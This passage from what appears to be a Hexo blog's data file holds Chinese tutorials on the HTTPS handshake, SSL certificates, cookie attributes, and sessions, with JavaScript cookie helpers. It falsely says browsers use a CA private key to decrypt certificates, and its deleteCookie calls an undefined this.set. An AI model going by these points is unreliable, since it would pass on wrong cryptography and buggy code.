id=\"方式-2：使用非对称加密\"><a href=\"#方式-2：使用非对称加密\" class=\"headerlink\" title=\"方式 2：使用非对称加密\"></a>方式 2：<strong>使用非对称加密</strong></h5><ul>\n<li>客户端发送给服务器的数据使用 <strong>公钥</strong> 加密，服务器使用 <strong>私钥</strong> 解密</li>\n<li>服务器发送给客户端的数据使用 <strong>私钥</strong> 加密，客户端使用 <strong>公钥</strong> 解密</li>\n</ul>\n<p>缺点：公钥是公开的，服务器发送给客户端的数据的数据容易被截获</p>\n<h5 id=\"方式-3：同时使用对称加密、非对称加密\"><a href=\"#方式-3：同时使用对称加密、非对称加密\" class=\"headerlink\" title=\"方式 3：同时使用对称加密、非对称加密\"></a>方式 3：<strong>同时使用对称加密、非对称加密</strong></h5><ul>\n<li>客户端发送给服务器的 <strong>对称加密算法、对称秘钥</strong> 使用 <strong>公钥</strong> 加密</li>\n<li>服务器发送给客户端的数据用此 <strong>对称加密算法、对称秘钥</strong> 加密，<strong>对称秘钥</strong> 协商完成</li>\n<li>客户端发送给服务器的数据使用 <strong>协商的对称秘钥</strong> 加密，服务器使用 <strong>协商的对称秘钥</strong> 解密</li>\n<li>服务器发送给的客户端数据使用 <strong>协商的对称秘钥</strong> 加密，客户端使用 <strong>协商的对称秘钥</strong> 解密</li>\n</ul>\n<blockquote>\n<p>问题：公钥加密（非对称加密）计算量太大，如何减少耗用的时间？<br>解决方法：每一次对话（session），客户端和服务器端都生成一个 <strong>对话密钥</strong>（双方协商的对称秘钥），用它来加密信息。由于 <strong>对话密钥</strong> 是对称加密，所以运算速度非常快，而服务器公钥只用于加密 <strong>对话密钥</strong> 本身，这样就减少了加密运算的消耗时间。</p>\n</blockquote>\n<p><img src=\"https://www.wosign.cn/Basic/images/howsslwork_clip_image002.gif\" alt=\"HTTPS 加密过程\"></p>\n<p>很明显，方式 3 比较合适 HTTP 的数据加密，但依然有 <strong>两个</strong> 问题：</p>\n<ol>\n<li>客户端如何获得公钥</li>\n<li>如何确认服务器是真实的而不是黑客</li>\n</ol>\n<blockquote>\n<p>获取公钥的过程并不能保证安全，似乎又得重新进行一次加密的过程（先有鸡还是先有蛋的问题），So what to do…</p>\n</blockquote>\n<h3 id=\"5、SSL-证书\"><a href=\"#5、SSL-证书\" class=\"headerlink\" title=\"5、SSL 证书\"></a>5、SSL 证书</h3><p>SSL证书，也称为服务器 SSL 证书，是遵守 SSL 协议的一种数字证书，由全球信任的证书颁发机构 (Certificate Authority，简称 CA) 验证服务器身份后颁发。将SSL证书安装在网站服务器上，可实现网站身份验证和数据加密传输双重功能。</p>\n<p>SSL 证书能同时解决了 <strong>公钥获取</strong> 问题和 <strong>黑客冒充</strong> 问题</p>\n<blockquote>\n<p>每种支持 HTTPS 的浏览器都内置的许多 CA 中心的公钥信息，CA 中心是浏览器开发商信任的授权机构，它为有需要的网站颁发用于验证的服务器公钥，颁发前 CA 中心应尽量确认申请者的身份，并确保颁发的服务器证书确实是由该域名使用的。<br/><br>至于CA中心的具体实现上，就是在创建一个新的 HTTPS 连接时，浏览器端收到服务器的签名公钥，验证签名后（除非 CA 的私钥泄漏，否则签名无法被伪造），检查证书里被签名的 cn 项（Common Name，常用名称）或 subjectAltName 项的值，由此确认对方确实是浏览器真正要访问的服务器，并确认该公钥不在 CA 机构的公开撤销列表里（例如，证书是假冒或欺诈手段获取到的）。如果所有检查都通过了，浏览器就可以用这个公钥加密信息并传回给服务器端，通过这种方式，确认只有特定的接收者才能对加密信息进行解密。</p>\n</blockquote>\n<p>SSL 证书是 CA 中心用自己 <strong>私钥</strong> 对申请者的信息进行加密的数据，当用户访问服务器是 SSL 证书从服务器下载到本地，然后浏览器内置了权威的 CA 中心的 <strong>私钥</strong>，用此 <strong>私钥</strong> 解密 SSL 证书中的数据，如果客户端计算出来的证书编号（使用证书中的 <strong>签名算法</strong> 进行计算）与证书中的证书编号相同，则验证通过。</p>\n<p><strong>SSL 证书包含的具体内容如下：</strong></p>\n<ul>\n<li>Version 版本</li>\n<li>Serial Number序列号</li>\n<li>Algorithm ID 算法标识</li>\n<li>Issuer 颁发者</li>\n<li>Validity 有效期</li>\n<li>Not Before 有效起始日期</li>\n<li>Not After 有效终止日期</li>\n<li>Subject 使用者</li>\n<li>Subject Public Key Info 使用者公钥信息</li>\n<li>Public Key Algorithm公钥算法</li>\n<li>Subject Public Key公钥</li>\n<li>Issuer Unique Identifier (Optional) 颁发者唯一标识（CA 中心）</li>\n<li>Subject Unique Identifier (Optional) 使用者唯一标识</li>\n<li>Extensions (Optional) 扩展</li>\n<li>…</li>\n<li>Certificate Signature Algorithm 证书签名算法（MD5 算法）</li>\n<li>Certificate Signature 证书签名</li>\n</ul>\n<p><strong>验证步骤：</strong></p>\n<ol>\n<li>首先浏览器读取证书中的证书所有者、有效期等信息进行一一校验</li>\n<li>浏览器开始查找操作系统中已内置的受信任的证书发布机构 CA，与服务器发来的证书中的颁发者 CA 比对，用于校验证书是否为合法机构颁发 </li>\n<li>如果找不到，浏览器就会报错，说明服务器发来的证书是不可信任的。</li>\n<li>如果找到，那么浏览器就会从操作系统中取出颁发者 CA  的公钥，然后对服务器发来的证书里面的签名进行解密</li>\n<li>浏览器使用相同的 hash 算法计算出服务器发来的证书的 hash 值，将这个计算的 hash 值与证书中签名做对比</li>\n<li>对比结果一致，则证明服务器发来的证书合法，没有被冒充</li>\n<li>此时浏览器就可以读取证书中的公钥，用于后续加密了</li>\n</ol>\n<blockquote>\n<p>认证信息 —哈希算法—&gt;  摘要 —私钥加密—&gt; 数字签名</p>\n</blockquote>\n<h3 id=\"6、HTTPS-的特点\"><a href=\"#6、HTTPS-的特点\" class=\"headerlink\" title=\"6、HTTPS 的特点\"></a>6、HTTPS 的特点</h3><h4 id=\"HTTPS-优点\"><a href=\"#HTTPS-优点\" class=\"headerlink\" title=\"HTTPS 优点\"></a>HTTPS 优点</h4><ol>\n<li>所有信息都是加密传播，黑客无法窃听</li>\n<li>具有校验机制，一旦被篡改，通信双方会立刻发现</li>\n<li>配备身份证书，防止身份被冒充</li>\n</ol>\n<h4 id=\"HTTPS-缺点\"><a href=\"#HTTPS-缺点\" class=\"headerlink\" title=\"HTTPS 缺点\"></a>HTTPS 缺点</h4><ol>\n<li>SSL 证书费用很高，以及其在服务器上的部署、更新维护非常繁琐</li>\n<li>HTTPS 降低用户访问速度（多次握手）</li>\n<li>网站改用 HTTPS 以后，由HTTP 跳转到 HTTPS 的方式增加了用户访问耗时（多数网站采用 302 跳转）</li>\n<li>HTTPS 涉及到的安全算法会消耗 CPU 资源，需要增加大量机器（https 访问过程需要加解密）</li>\n</ol>\n"},{"title":"Cookie","date":"2021-01-14T07:45:00.000Z","_content":"\n# Cookie \n\n### Cookie\nCookie是网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据，是实现持久会话的最好方式\n\n**cookie 属性**\n| 选项 | 作用 |\n| --- | --- |\n| name | 设置 cookie 的名称 |\n| value | 设置 cookie 的值 |\n| domain | 设置可以访问此 cookie 的域名 |\n| path | 设置可以访问此 cookie 的页面路径，比如domain是abc.com,path是/test，那么只有/test路径下的页面可以读取此cookie |\n| expires/Max-Age | 设置字段为此cookie超时时间。若设置其值为一个时间，那么当到达此时间后，此cookie失效。不设置的话默认值是Session，意思是cookie会和session一起失效。当浏览器关闭(不是浏览器标签页，而是整个浏览器) 后，此cookie失效。 |\n| size | 表示此 cookie 大小 |\n| http | 设置 cookie 的 httponly 属性。若此属性为true，则只有在http请求头中会带有此cookie的信息，而不能通过document.cookie来访问此cookie。 |\n| secure | 设置是否只能通过https来传递此条cookie |\n| sameSite | 允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）|\n\n**SameSite Cookies 可选字段**\n* None: 浏览器会在同站请求、跨站请求下继续发送cookies，不区分大小写\n* Lax: 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者frames的调用，但只有当用户从外部站点导航到URL时才会发送。如 link链接，预加载请求，GET 表单\n* Strict: 浏览器将只在访问相同站点时发送cookie。\n\n\n**Cookie 的分类**\n* 会话Cookie：不包含过期时间，该Cookie保存在内存中，当浏览器关闭时该Cookie失效\n* 持久性Cookie：包含过期时间，该Cookie保存在硬盘内，当到达指定日期时，该Cookie失效\n\n\n```\n// 响应头中设置 Cookie\nSet-Cookie: name1=value1 [ ;expires=date][ ;domain=domain][ ;path=path][ ;secure]\nSet-Cookie: name2=value2 [ ;expires=date][ ;domain=domain][ ;path=path][ ;secure]\n```\n\n```\n// 请求头中的 Cookie\nCookie: name1=value1; name2=value2;\n```\n\n\n```js\n// js 操作 Cookie\n\n/**\n * 根据cookie名称获取cookie值\n * @param  {String} name cookie名称\n * @return {[type]}      [description]\n */\nfunction getCookie(name) {\n  var arr = document.cookie.match(new RegExp(\"(^|\\\\W)\" + name + \"=([^;]*)(;|$)\"));\n  if (arr !== null) {\n      return decodeURIComponent(arr[2]);\n  }\n  return '';\n}\n\n/**\n * @param {Object} options 参数配置\n * @param {String} options.name cookie的名称\n * @param {String} options.value cookie的值\n * @param {String} options.domain cookie访问权限域名，默认为当前域名\n * @param {String} options.path 默认为 /\n * @param {Date} options.expires 如果不设置或不是 Date 类型，则默认为会话 cookie\n * @return {scope}      this\n */\nfunction setCookie(options) {\n  var name = options.name;\n  var value = options.value;\n  var path = options.path || \"/\";\n  var domain = options.domain;\n  var expires = options.expires;\n  var str = name + \"=\" + escape(value) + \"; \";\n  str += \"path=\" + path + \"; \";\n  if (domain) {\n      str += \"domain=\" + domain + \"; \";\n  }\n  if (expires instanceof Date) {\n      str += \"expires=\" + expires.toGMTString() + \"; \";\n  }\n  document.cookie = str;\n  return this;\n}\n\n/**\n* 删除 cookie\n* @param  {String} name cookie 名称\n* @param  {String} domain cookie 域\n* @param  {String} path cookie 路径\n* @return {scope}      this\n*/\nfunction deleteCookie(name, domain, path) {\n  this.set({\n      name: name,\n      value: '',\n      domain: domain,\n      path: path,\n      expires: new Date()\n  });\n  return this;\n}\n```\n\n\n### Session\nSession 是一种服务器端机制，具有保持连接的含义。当浏览器第一次访问时，服务器创建 Session，然后将 Session的 Id 以 Cookie 的形式发送回给浏览器，后续的访问会带上 Cookie，可用于识别用户，起到面向连接的作用。\n\nSession 对象在一段时间（如20min）没被使用，就会被销毁，或手动销毁 Session\n\n**注意事项**\n* 用户访问某个网站，登录成功后，服务器后生成一个 Session 对象，并设置失效时间，用于跟踪用户的操作和状态，并将Session产生的唯一标识符保存在Cookie中（即通过 Set-Cookie 响应头返回给浏览器，假设为 SessionId ），在一段时间内，用户访问其他页面时，会将Cookie（包含SessionId）传回给服务器，以此模拟\"登陆态\"功能。\n* 当用户关闭浏览器时，浏览器并不会发送任何信息到服务器，因此服务器端的 Session 依然有效，直到 Session 超过设置的时间，若这段时间内获取 SessionId 的值并传给服务器（如CSFR、XSS），依然可以保持为登陆状态，并获取该用户的所有权限。\n\n> session 在服务器端用类似于 Map 结构的形式存储，当标签页或浏览器关闭时并不会通知到后端清除 session\n> sessionStorage 用于存储前端数据，当标签页或浏览器关闭时 sessionStorage 中的数据会被清除\n","source":"_posts/Web 安全/cookie.md","raw":"---\ntitle: Cookie\ncategories: Web 安全\ntags: [web 安全, cookie]\ndate: 2021-01-14 15:45:00\n---\n\n# Cookie \n\n### Cookie\nCookie是网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据，是实现持久会话的最好方式\n\n**cookie 属性**\n| 选项 | 作用 |\n| --- | --- |\n| name | 设置 cookie 的名称 |\n| value | 设置 cookie 的值 |\n| domain | 设置可以访问此 cookie 的域名 |\n| path | 设置可以访问此 cookie 的页面路径，比如domain是abc.com,path是/test，那么只有/test路径下的页面可以读取此cookie |\n| expires/Max-Age | 设置字段为此cookie超时时间。若设置其值为一个时间，那么当到达此时间后，此cookie失效。不设置的话默认值是Session，意思是cookie会和session一起失效。当浏览器关闭(不是浏览器标签页，而是整个浏览器) 后，此cookie失效。 |\n| size | 表示此 cookie 大小 |\n| http | 设置 cookie 的 httponly 属性。若此属性为true，则只有在http请求头中会带有此cookie的信息，而不能通过document.cookie来访问此cookie。 |\n| secure | 设置是否只能通过https来传递此条cookie |\n| sameSite | 允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）|\n\n**SameSite Cookies 可选字段**\n* None: 浏览器会在同站请求、跨站请求下继续发送cookies，不区分大小写\n* Lax: 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者frames的调用，但只有当用户从外部站点导航到URL时才会发送。如 link链接，预加载请求，GET 表单\n* Strict: 浏览器将只在访问相同站点时发送cookie。\n\n\n**Cookie 的分类**\n* 会话Cookie：不包含过期时间，该Cookie保存在内存中，当浏览器关闭时该Cookie失效\n* 持久性Cookie：包含过期时间，该Cookie保存在硬盘内，当到达指定日期时，该Cookie失效\n\n\n```\n// 响应头中设置 Cookie\nSet-Cookie: name1=value1 [ ;expires=date][ ;domain=domain][ ;path=path][ ;secure]\nSet-Cookie: name2=value2 [ ;expires=date][ ;domain=domain][ ;path=path][ ;secure]\n```\n\n```\n// 请求头中的 Cookie\nCookie: name1=value1; name2=value2;\n```\n\n\n```js\n// js 操作 Cookie\n\n/**\n * 根据cookie名称获取cookie值\n * @param  {String} name cookie名称\n * @return {[type]}      [description]\n */\nfunction getCookie(name) {\n  var arr = document.cookie.match(new RegExp(\"(^|\\\\W)\" + name + \"=([^;]*)(;|$)\"));\n  if (arr !== null) {\n      return decodeURIComponent(arr[2]);\n  }\n  return '';\n}\n\n/**\n * @param {Object} options 参数配置\n * @param {String} options.name cookie的名称\n * @param {String} options.value cookie的值\n * @param {String} options.domain cookie访问权限域名，默认为当前域名\n * @param {String} options.path 默认为 /\n * @param {Date} options.expires 如果不设置或不是 Date 类型，则默认为会话 cookie\n * @return {scope}      this\n */\nfunction setCookie(options) {\n  var name = options.name;\n  var value = options.value;\n  var path = options.path || \"/\";\n  var domain = options.domain;\n  var expires = options.expires;\n  var str = name + \"=\" + escape(value) + \"; \";\n  str += \"path=\" + path + \"; \";\n  if (domain) {\n      str += \"domain=\" + domain + \"; \";\n  }\n  if (expires instanceof Date) {\n      str += \"expires=\" + expires.toGMTString() + \"; \";\n  }\n  document.cookie = str;\n  return this;\n}\n\n/**\n* 删除 cookie\n* @param  {String} name cookie 名称\n* @param  {String} domain cookie 域\n* @param  {String} path cookie 路径\n* @return {scope}      this\n*/\nfunction deleteCookie(name, domain, path) {\n  this.set({\n      name: name,\n      value: '',\n      domain: domain,\n      path: path,\n      expires: new Date()\n  });\n  return this;\n}\n```\n\n\n### Session\nSession 是一种服务器端机制，具有保持连接的含义。当浏览器第一次访问时，服务器创建 Session，然后将 Session的 Id 以 Cookie 的形式发送回给浏览器，后续的访问会带上 Cookie，可用于识别用户，起到面向连接的作用。\n\nSession 对象在一段时间（如20min）没被使用，就会被销毁，或手动销毁 Session\n\n**注意事项**\n* 用户访问某个网站，登录成功后，服务器后生成一个 Session 对象，并设置失效时间，用于跟踪用户的操作和状态，并将Session产生的唯一标识符保存在Cookie中（即通过 Set-Cookie 响应头返回给浏览器，假设为 SessionId ），在一段时间内，用户访问其他页面时，会将Cookie（包含SessionId）传回给服务器，以此模拟\"登陆态\"功能。\n* 当用户关闭浏览器时，浏览器并不会发送任何信息到服务器，因此服务器端的 Session 依然有效，直到 Session 超过设置的时间，若这段时间内获取 SessionId 的值并传给服务器（如CSFR、XSS），依然可以保持为登陆状态，并获取该用户的所有权限。\n\n> session 在服务器端用类似于 Map 结构的形式存储，当标签页或浏览器关闭时并不会通知到后端清除 session\n> sessionStorage 用于存储前端数据，当标签页或浏览器关闭时 sessionStorage 中的数据会被清除\n","slug":"Web 安全/cookie","published":1,"updated":"2021-04-30T07:22:51.262Z","_id":"cko3zocgn0009ox6r2yqv8szw","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h1><h3 id=\"Cookie-1\"><a href=\"#Cookie-1\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h3><p>Cookie是网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据，是实现持久会话的最好方式</p>\n<p><strong>cookie 属性</strong><br>| 选项 | 作用 |<br>| — | — |<br>| name | 设置 cookie 的名称 |<br>| value | 设置 cookie 的值 |<br>| domain | 设置可以访问此 cookie 的域名 |<br>| path | 设置可以访问此 cookie 的页面路径，比如domain是abc.com,path是/test，那么只有/test路径下的页面可以读取此cookie |<br>| expires/Max-Age | 设置字段为此cookie超时时间。若设置其值为一个时间，那么当到达此时间后，此cookie失效。不设置的话默认值是Session，意思是cookie会和session一起失效。当浏览器关闭(不是浏览器标签页，而是整个浏览器) 后，此cookie失效。 |<br>| size | 表示此 cookie 大小 |<br>| http | 设置 cookie 的 httponly 属性。若此属性为true，则只有在http请求头中会带有此cookie的信息，而不能通过document.cookie来访问此cookie。 |<br>| secure | 设置是否只能通过https来传递此条cookie |<br>| sameSite | 允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）|</p>\n<p><strong>SameSite Cookies 可选字段</strong></p>\n<ul>\n<li>None: 浏览器会在同站请求、跨站请求下继续发送cookies，不区分大小写</li>\n<li>Lax: 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者frames的调用，但只有当用户从外部站点导航到URL时才会发送。如 link链接，预加载请求，GET 表单</li>\n<li>Strict: 浏览器将只在访问相同站点时发送cookie。</li>\n</ul>\n<p><strong>Cookie 的分类</strong></p>\n<ul>\n<li>会话Cookie：不包含过期时间，该Cookie保存在内存中，当浏览器关闭时该Cookie失效</li>\n<li>持久性Cookie：包含过期时间，该Cookie保存在硬盘内，当到达指定日期时，该Cookie失效</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 响应头中设置 Cookie</span><br><span class=\"line\">Set-Cookie: name1&#x3D;value1 [ ;expires&#x3D;date][ ;domain&#x3D;domain][ ;path&#x3D;path][ ;secure]</span><br><span class=\"line\">Set-Cookie: name2&#x3D;value2 [ ;expires&#x3D;date][ ;domain&#x3D;domain][ ;path&#x3D;path][ ;secure]</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 请求头中的 Cookie</span><br><span class=\"line\">Cookie: name1&#x3D;value1; name2&#x3D;value2;</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// js 操作 Cookie</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 根据cookie名称获取cookie值</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param  <span class=\"type\">&#123;String&#125;</span> </span>name cookie名称</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return <span class=\"type\">&#123;[type]&#125;</span>      </span>[description]</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getCookie</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> arr = <span class=\"built_in\">document</span>.cookie.match(<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">&quot;(^|\\\\W)&quot;</span> + name + <span class=\"string\">&quot;=([^;]*)(;|$)&quot;</span>));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (arr !== <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">decodeURIComponent</span>(arr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;Object&#125;</span> </span>options 参数配置</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;String&#125;</span> </span>options.name cookie的名称</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;String&#125;</span> </span>options.value cookie的值</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;String&#125;</span> </span>options.domain cookie访问权限域名，默认为当前域名</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;String&#125;</span> </span>options.path 默认为 /</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;Date&#125;</span> </span>options.expires 如果不设置或不是 Date 类型，则默认为会话 cookie</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return <span class=\"type\">&#123;scope&#125;</span>      <span class=\"variable\">this</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setCookie</span>(<span class=\"params\">options</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> name = options.name;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> value = options.value;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> path = options.path || <span class=\"string\">&quot;/&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> domain = options.domain;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> expires = options.expires;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> str = name + <span class=\"string\">&quot;=&quot;</span> + <span class=\"built_in\">escape</span>(value) + <span class=\"string\">&quot;; &quot;</span>;</span><br><span class=\"line\">  str += <span class=\"string\">&quot;path=&quot;</span> + path + <span class=\"string\">&quot;; &quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (domain) &#123;</span><br><span class=\"line\">      str += <span class=\"string\">&quot;domain=&quot;</span> + domain + <span class=\"string\">&quot;; &quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (expires <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Date</span>) &#123;</span><br><span class=\"line\">      str += <span class=\"string\">&quot;expires=&quot;</span> + expires.toGMTString() + <span class=\"string\">&quot;; &quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.cookie = str;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">* 删除 cookie</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@param  <span class=\"type\">&#123;String&#125;</span> </span>name cookie 名称</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@param  <span class=\"type\">&#123;String&#125;</span> </span>domain cookie 域</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@param  <span class=\"type\">&#123;String&#125;</span> </span>path cookie 路径</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@return <span class=\"type\">&#123;scope&#125;</span>      <span class=\"variable\">this</span></span></span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deleteCookie</span>(<span class=\"params\">name, domain, path</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.set(&#123;</span><br><span class=\"line\">      name: name,</span><br><span class=\"line\">      value: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">      domain: domain,</span><br><span class=\"line\">      path: path,</span><br><span class=\"line\">      expires: <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h3><p>Session 是一种服务器端机制，具有保持连接的含义。当浏览器第一次访问时，服务器创建 Session，然后将 Session的 Id 以 Cookie 的形式发送回给浏览器，后续的访问会带上 Cookie，可用于识别用户，起到面向连接的作用。</p>\n<p>Session 对象在一段时间（如20min）没被使用，就会被销毁，或手动销毁 Session</p>\n<p><strong>注意事项</strong></p>\n<ul>\n<li>用户访问某个网站，登录成功后，服务器后生成一个 Session 对象，并设置失效时间，用于跟踪用户的操作和状态，并将Session产生的唯一标识符保存在Cookie中（即通过 Set-Cookie 响应头返回给浏览器，假设为 SessionId ），在一段时间内，用户访问其他页面时，会将Cookie（包含SessionId）传回给服务器，以此模拟”登陆态”功能。</li>\n<li>当用户关闭浏览器时，浏览器并不会发送任何信息到服务器，因此服务器端的 Session 依然有效，直到 Session 超过设置的时间，若这段时间内获取 SessionId 的值并传给服务器（如CSFR、XSS），依然可以保持为登陆状态，并获取该用户的所有权限。</li>\n</ul>\n<blockquote>\n<p>session 在服务器端用类似于 Map 结构的形式存储，当标签页或浏览器关闭时并不会通知到后端清除 session<br>sessionStorage 用于存储前端数据，当标签页或浏览器关闭时 sessionStorage 中的数据会被清除</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h1><h3 id=\"Cookie-1\"><a href=\"#Cookie-1\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h3><p>Cookie是网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据，是实现持久会话的最好方式</p>\n<p><strong>cookie 属性</strong><br>| 选项 | 作用 |<br>| — | — |<br>| name | 设置 cookie 的名称 |<br>| value | 设置 cookie 的值 |<br>| domain | 设置可以访问此 cookie 的域名 |<br>| path | 设置可以访问此 cookie 的页面路径，比如domain是abc.com,path是/test，那么只有/test路径下的页面可以读取此cookie |<br>| expires/Max-Age | 设置字段为此cookie超时时间。若设置其值为一个时间，那么当到达此时间后，此cookie失效。不设置的话默认值是Session，意思是cookie会和session一起失效。当浏览器关闭(不是浏览器标签页，而是整个浏览器) 后，此cookie失效。 |<br>| size | 表示此 cookie 大小 |<br>| http | 设置 cookie 的 httponly 属性。若此属性为true，则只有在http请求头中会带有此cookie的信息，而不能通过document.cookie来访问此cookie。 |<br>| secure | 设置是否只能通过https来传递此条cookie |<br>| sameSite | 允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）|</p>\n<p><strong>SameSite Cookies 可选字段</strong></p>\n<ul>\n<li>None: 浏览器会在同站请求、跨站请求下继续发送cookies，不区分大小写</li>\n<li>Lax: 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者frames的调用，但只有当用户从外部站点导航到URL时才会发送。如 link链接，预加载请求，GET 表单</li>\n<li>Strict: 浏览器将只在访问相同站点时发送cookie。</li>\n</ul>\n<p><strong>Cookie 的分类</strong></p>\n<ul>\n<li>会话Cookie：不包含过期时间，该Cookie保存在内存中，当浏览器关闭时该Cookie失效</li>\n<li>持久性Cookie：包含过期时间，该Cookie保存在硬盘内，当到达指定日期时，该Cookie失效</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td 